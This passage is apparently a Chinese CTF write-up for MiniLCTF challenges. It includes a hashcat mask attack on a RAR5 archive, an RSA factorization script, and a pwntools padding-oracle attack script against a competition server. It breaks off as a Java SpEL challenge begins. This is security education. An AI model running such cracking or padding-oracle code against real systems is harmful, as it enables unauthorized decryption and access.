class="comment">//如果数列a中有n则先手必败</span></span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Win\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面都是理论，看看就行。</p><h3 id="再看出题人的意思"><a href="#再看出题人的意思" class="headerlink" title="再看出题人的意思**"></a>再看出题人的意思**</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">题意：</span><br><span class="line"></span><br><span class="line">两个人轮流抓猫。初始有 n 只猫，第一次最少抓 1 只，最多抓 n - 1 只。之后的每轮至少抓 1 只，至多不能超过上一次抓的数量。抓走最后一只猫的人胜利。电脑先抓且保证第一次抓不是最优解。</span><br><span class="line"></span><br><span class="line">先上结论：n 是 2 的幂时后手必胜，否则先手必胜</span><br><span class="line"></span><br><span class="line">证明：</span><br><span class="line"></span><br><span class="line">考虑这个数的最低二进制位，即 lowbit ，例如 6 的 lowbit 是 2 ，12 的 lowbit 是 4</span><br><span class="line"></span><br><span class="line">现在拿走 n 的 lowbit ，记为 b，讨论对方的做法，记拿的数为 a</span><br><span class="line"></span><br><span class="line">① a = b</span><br><span class="line"></span><br><span class="line">易证剩下的数 n - 2b 的 lowbit 还是 b ，下一步可以再拿 b</span><br><span class="line"></span><br><span class="line">② a &lt; b</span><br><span class="line"></span><br><span class="line">由于 b 是 2 的幂，所以小于 b 且大于 1 的数必由小于 b 的二进制位组成</span><br><span class="line"></span><br><span class="line">易证剩下的数 n - a - b 的 lowbit 一定小于 b，所以下一步必定可以拿走更小的 lowbit</span><br><span class="line"></span><br><span class="line">因此每次必可以拿走当前数的 lowbit ，直至当前数为 1 为止，此时数的 lowbit 为自身，拿走即胜利</span><br><span class="line"></span><br><span class="line">需要注意的是，对方任何时候都不可能拿走剩下的所有数，因为 n - lowbit(n) &gt; lowbit(n)</span><br><span class="line"></span><br><span class="line">而当初始数为 2 的幂的时候，没有 lowbit 可拿（最多拿 n - 1 ），此时拿任何数都会导致对方出现可拿的 lowbit ，因此必败</span><br></pre></td></tr></table></figure><h3 id="什么是二进制最低位？"><a href="#什么是二进制最低位？" class="headerlink" title="什么是二进制最低位？"></a><strong>什么是二进制最低位</strong>？</h3><p>首先要理解<a href="https://blog.csdn.net/qunqunstyle99/article/details/82716990">二进制最低位</a>这个概念`给出一个整数A，输出它的最低位数<br>比如：A= 26，它的二进制形式为：11010，最低位为10，所以应该输出2<br>再比如 A=92，它的二进制为：01011100，最低位为：100，所以应输出4。其实就是转为二进制从右到左首先出现1的数。</p><h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a><strong>尝试</strong></h3><p>首先输入的不能为奇数，不然二进制最低位都是1，电脑抓的猫猫就都为1，一直偶数抓下去就必输。其次我们输入的偶数要让电脑抓的是奇数，然后我们输入1，这样才能使剩余的为奇数，我们一直抓一直猫猫就必赢了。</p><p>怎么才能使电脑抓的使奇数呢？</p><p>就牵扯到二进制最低位了，举个列子，不用完全搞懂，实验是真理的唯一标准！</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a><strong>实验</strong></h3><p>我的XDU一共是是150个猫猫，CDCQ抓到34个猫猫，还剩116个。</p><p>116的二进制是111 0100，所以他的最低位是100，就是2的2次方为4。</p><p>所以我们输入二进制最低位4，直接爆出奇数。</p><p>其实用上面的公式也可以n-1为奇数，太抽象了。。。原理我这个数学渣渣也不知道</p><p>n 是 2 的幂时，计算二进制位，就可以拿到flag了。</p><ol><li><h2 id="好康的硬盘"><a href="#好康的硬盘" class="headerlink" title="好康的硬盘"></a>好康的硬盘</h2></li></ol><p>文件zip打开flag.txt一看什么都没有就是零宽隐写也可以到kali的vim里面去验证</p><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">解密网站</a>很多解密出来<code>minil****</code></p><p>rar5用工具好像爆破不出来，用kali里面的rar2john+hashcat。正巧上次用来爆破word文档密码。</p><p><code>rar2john luoqian.rar</code>生成rar的hash值保存在test.hash里面。注意是这个格式<code>$rar5$16$529d132521c41a0d068fa8ceeab29cde$15$8c79ff2fb201f8b6c1a0981bb57e20c9$8$4138cf0615f62942</code></p><p>然后用<code>hashcat -m 13000 -a 3 test.hash minil?a?a?a?a </code> 慢慢跑。</p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/222222.jpg"></p><p>密码:<code>minil4396</code> </p><p>解压是个img镜像文件，因为不是取证，用看磁盘的工具就行，正巧我上次又下载了一个能搞硬盘的工具(X-Ways Forensics)打开</p><p>![](<a href="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444</a> (1).png)选择转为磁盘</p><p>![](<a href="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444">https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44444</a> (1).png)选择分区1浏览即可</p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1639481727(1).jpg"></p><p>有两个可疑的文件，MP4确实挺好看，但注意到了中间有几张图片。</p><p>所以进行分离。正好X-Ways Forensics有自带的分离，点击MP4右击抽取连续的帧。从0开始，帧数有点多9999够了，其他的默认。慢慢找，一个图片里都有一个密码，全部找到就行了。</p><p>密码：<code>7355608</code> </p><p>最后还有一个邮件，估计使用里面的内容解密flag</p><p>是一堆奇怪的英文。这个txt题目是奇怪的邮件，把内容全部往谷歌里一丢，找到<a href="https://www.spammimic.com/">垃圾邮件隐写</a>。输入密码，解密就有flag</p><p><code>MiniLCTF&#123;n3ver_g0nna_L3t_Y0u_dowN&#125;</code></p><ol><li><h2 id="Recombination"><a href="#Recombination" class="headerlink" title="Recombination"></a>Recombination</h2></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/222.jpg"></p><p>图片zip压缩包，改一下就行，伪加密1改成0。</p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/0000.jpg"></p><p>得到一串字符。尝试了转16进制，shellcode等常规操作。无果。</p><p>后来在一篇<a href="https://blog.csdn.net/mochu7777777/article/details/115276176">DASCTF三月赛的WP</a>中看到关于aa3d的内容，后来又搜到了<a href="https://john-doe.fun/bytectf-2020-misc-writeup/">ByteCTF 2020 Misc WP</a>,感觉字符串的重复情况相当类似。</p><p>用aa3d试了一样的，字符串长度为4559，那正好分解为47*97的矩阵。</p><p>放在记事本里，截图。将截图用stegsolve打开，使用<code>Analyze</code>&gt;<code>Stereogram Solver</code>，调整图片位移，看到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/111111.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/555555.jpg"></p><p>慢慢试就出来了。<code>MiniL&#123;A@3d-1s_Ar7!!&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="asr"><a href="#asr" class="headerlink" title="asr"></a>asr</h2><p>高低位一起dfs 。shallow之前的脚本拉出来改的。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d =inverse(e,phi)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_p_q</span>():</span></span><br><span class="line">    p_low = [<span class="number">0</span>]</span><br><span class="line">    q_high = [<span class="number">0</span>]</span><br><span class="line">    q_low = [<span class="number">0</span>]</span><br><span class="line">    p_high = [<span class="number">0</span>]</span><br><span class="line">    maskx = <span class="number">1</span></span><br><span class="line">    maskn = <span class="number">2</span></span><br><span class="line">    si = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x_lowbits = (x &amp; maskx) &gt;&gt; i</span><br><span class="line">        n_lowbits = (n % maskn)</span><br><span class="line">        tmppp_low = []</span><br><span class="line">        tmpqq_low = []</span><br><span class="line">        tmppp_high =[]</span><br><span class="line">        tmpqq_high =[]</span><br><span class="line">        x_highbits = (x &gt;&gt; (<span class="number">511</span>-i)) &amp; <span class="number">1</span></span><br><span class="line">        n_highbits = (n)&gt;&gt; (<span class="number">1022</span> - <span class="number">2</span>*i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p_low)):</span><br><span class="line">            <span class="keyword">for</span> pp_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> qq_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> pp_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> qq_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">if</span> pp_low ^ qq_high == x_lowbits <span class="keyword">and</span> qq_low ^ pp_high == x_highbits:</span><br><span class="line">                                temp1 = ((pp_low * maskn //<span class="number">2</span> + p_low[j]) * (qq_low * maskn // <span class="number">2</span> + q_low[j])) % maskn </span><br><span class="line">                                temp2 = (((pp_high &lt;&lt; (<span class="number">511</span>-i)) + p_high[j]) * ((qq_high &lt;&lt; (<span class="number">511</span>-i)) + q_high[j]))&gt;&gt;(<span class="number">1022</span>-<span class="number">2</span>*i)</span><br><span class="line">                                <span class="keyword">if</span> temp1 == n_lowbits :</span><br><span class="line">                                    <span class="keyword">if</span> n_highbits-temp2 &gt;= <span class="number">0</span>  <span class="keyword">and</span> n_highbits-temp2 &lt;=(<span class="number">2</span>&lt;&lt;i+<span class="number">1</span>):</span><br><span class="line">                                        <span class="comment">#print(&quot;down&quot;)</span></span><br><span class="line">                                        tmppp_low.append(pp_low * maskn //<span class="number">2</span> + p_low[j])</span><br><span class="line">                                        tmpqq_low.append(qq_low * maskn //<span class="number">2</span> + q_low[j])</span><br><span class="line">                                        tmppp_high.append((pp_high&lt;&lt;(<span class="number">511</span>-i))+p_high[j])</span><br><span class="line">                                        tmpqq_high.append((qq_high&lt;&lt;(<span class="number">511</span>-i))+q_high[j])</span><br><span class="line">                                        <span class="comment">#print(tmppp_low)</span></span><br><span class="line">                                        <span class="comment">#print(tmpqq_low)</span></span><br><span class="line">                                        <span class="comment">#print(tmppp_high)</span></span><br><span class="line">                                        <span class="comment">#print(tmpqq_high)</span></span><br><span class="line">        maskn *= <span class="number">2</span></span><br><span class="line">        maskx *= <span class="number">2</span></span><br><span class="line">        p_low = tmppp_low</span><br><span class="line">        q_low = tmpqq_low</span><br><span class="line">        p_high = tmppp_high</span><br><span class="line">        q_high = tmpqq_high</span><br><span class="line">        <span class="built_in">print</span>(i,<span class="built_in">len</span>(p_low))</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> p_low:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> p_high:</span><br><span class="line">            <span class="keyword">if</span> n %(a+b) ==<span class="number">0</span>:</span><br><span class="line">                p = a + b</span><br><span class="line">                <span class="built_in">print</span>(p)</span><br><span class="line">                q = n//p</span><br><span class="line">                <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    n = <span class="number">142640215238537871365683719891541306935180737226071087966538112975312943506714964164341655541156886519552359173518384366335764339838818638439617545046906731685628758140658162759582216079833807742803333237267119228131836589616600586722503125595590784393805677472708123448256012705645099262323873911736910168311</span></span><br><span class="line">    c = <span class="number">141992115210477059329798383810995602331919683555539663737474122431362785313684902184569357178889736223104558359787247242121836892146092641430333220915928891299001128364434856756544237628623127350186698031711524123158225428351095110283324920060240308834304841350657100420648385312630518518518978998617676378512</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    x = <span class="number">2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874</span> </span><br><span class="line">    p , q = get_p_q()</span><br><span class="line">    flag = get_flag()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>miniLCTF&#123;reverse_1s_als0_e1sy&#125;&#39;</code></p><h2 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h2><p>原来那道题…想的是用base64去爆破大概的每位是啥…但是发现出的是32位哈希值 没法爆破，浪费了好一会时间… Padding Oracle…细节真难调…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_least_length</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">        guess = <span class="string">b&#x27;\x00&#x27;</span> * i</span><br><span class="line">        c = b64decode(get_recv(guess))</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            base = <span class="built_in">len</span>(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(c) != base:</span><br><span class="line">            <span class="keyword">return</span> base - <span class="number">16</span> - i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_recv</span>(<span class="params">x</span>):</span></span><br><span class="line">    io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.send(b64encode(x))</span><br><span class="line">    Res = io.recvuntil(<span class="string">b&#x27;flag;&#x27;</span>).decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> Res[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_message_last</span>(<span class="params">c</span>):</span></span><br><span class="line">    guess = long_to_bytes(<span class="number">66</span>) * <span class="number">239</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        G = guess + long_to_bytes(i)</span><br><span class="line">        io.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        io.send(b64encode(G + c))</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        io.send(b64encode(IV))</span><br><span class="line">        resp = io.recvuntil(<span class="string">b&#x27;flag;&#x27;</span>).decode().split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    IV = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    LengTh = <span class="number">0</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    M = [<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">    <span class="keyword">while</span> LengTh == <span class="literal">None</span> <span class="keyword">or</span> LengTh != <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;pwn.archive.xdsec.chall.frankli.site&#x27;</span>, <span class="number">10088</span>)</span><br><span class="line">            io.recv()</span><br><span class="line">            LengTh = get_least_length()</span><br><span class="line">            <span class="built_in">print</span>(LengTh)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Get Length!!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        pad = <span class="string">b&#x27;\x76&#x27;</span> * <span class="number">16</span> + (<span class="number">15</span> - i) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        res = get_recv(pad)</span><br><span class="line">        ciphertext.append(b64decode(res))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Get Ciphertext!!!&#x27;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            c16 = c[<span class="number">48</span>:<span class="number">64</span>]</span><br><span class="line">            M[-<span class="number">1</span>] = long_to_bytes(get_message_last(c16) ^ c[<span class="number">47</span>])</span><br><span class="line">        c16 = c[<span class="number">32</span>:<span class="number">48</span>]</span><br><span class="line">        M[i] = long_to_bytes(get_message_last(c16) ^ c[<span class="number">31</span>])</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    m = <span class="string">b&#x27;&#x27;</span>.join(M)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Get Message!!!&#x27;</span>)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br><span class="line">    io.send(b64encode(m))</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/1111111.png"></p><p><code>xdsec&#123;f3e2f3fd-afd1-4e02-90ed-d02e9cd4caba&#125;</code></p><h2 id="土块"><a href="#土块" class="headerlink" title="土块"></a>土块</h2><p>把题目中的<code>game</code>函数拿出来研究，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tukuai <span class="keyword">import</span> game</span><br><span class="line">cheat=[[<span class="number">9</span>,[<span class="number">1</span>,<span class="number">0</span>]],[<span class="number">9</span>,[<span class="number">0</span>,<span class="number">1</span>]]]</span><br><span class="line">init_state = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">coin1 = randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">coin2 = randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">temp = coin1 * <span class="number">2</span> + coin2</span><br><span class="line">init_state[temp] = <span class="number">1</span></span><br><span class="line">servercoin,qc = game(cheat, init_state)</span><br><span class="line"><span class="built_in">print</span>(coin1)</span><br><span class="line"><span class="built_in">print</span>(coin2)</span><br><span class="line"><span class="built_in">print</span>(init_state)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my coin is &#x27;</span> + <span class="built_in">str</span>(servercoin) + <span class="string">&#x27; your coin is?&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> qiskit.tools.visualization <span class="keyword">import</span> plot_bloch_multivector</span><br><span class="line">display(plot_bloch_multivector(init_state))</span><br><span class="line">simulator=Aer.get_backend(<span class="string">&#x27;qasm_simulator&#x27;</span>)</span><br><span class="line">result=execute(qc,backend=simulator).result()</span><br><span class="line"><span class="keyword">from</span> qiskit.tools.visualization <span class="keyword">import</span> plot_histogram</span><br><span class="line">display(qc.draw(output=<span class="string">&#x27;mpl&#x27;</span>))</span><br><span class="line">display(plot_histogram(result.get_counts(qc)))</span><br></pre></td></tr></table></figure><p>画出几个图出来看看，只要绘出 bot 的输出 = my coin 的量子电路即可，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">       ┌──────────────────────┐┌───┐        </span><br><span class="line">q12_0: ┤0                     ├┤ X ├──■─────</span><br><span class="line">       │  initialize(0,0,1,0) │└─┬─┘┌─┴─┐┌─┐</span><br><span class="line">q12_1: ┤1                     ├──■──┤ X ├┤M├</span><br><span class="line">       └──────────────────────┘     └───┘└╥┘</span><br><span class="line"> c1: 1/═══════════════════════════════════╩═</span><br><span class="line">                                          0 </span><br></pre></td></tr></table></figure><p>qubits…..量子计算学习….量子通信~ <a href="https://qiskit.org/textbook/preface.html%E7%BF%BB%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3">https://qiskit.org/textbook/preface.html翻官方文档</a> 复制让01输出01，10输出10 巧！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">Rec = <span class="keyword">lambda</span>  :p.recv()</span><br><span class="line">Sen = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">RecUntil = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RecSen</span>(<span class="params">x</span>):</span></span><br><span class="line">    Rec()</span><br><span class="line">    Sen(x)</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10095</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;lubenwei&quot;</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;1 0&quot;</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">    RecSen(<span class="string">&quot;0 1&quot;</span>)</span><br><span class="line">    Sen(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        RecUntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line">        num = (p.recv(<span class="number">1</span>))</span><br><span class="line">        RecSen(<span class="built_in">str</span>(<span class="built_in">int</span>(num.decode())))</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(p.recvline()[:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/76767.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>做这道题前，Java负基础(啥也不会,甚至怀疑人生) 题目打开给个压缩包，下载下来发现是一个Java的小项目的源文件，把每个都打开看看，感觉比较关键的文件是这个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 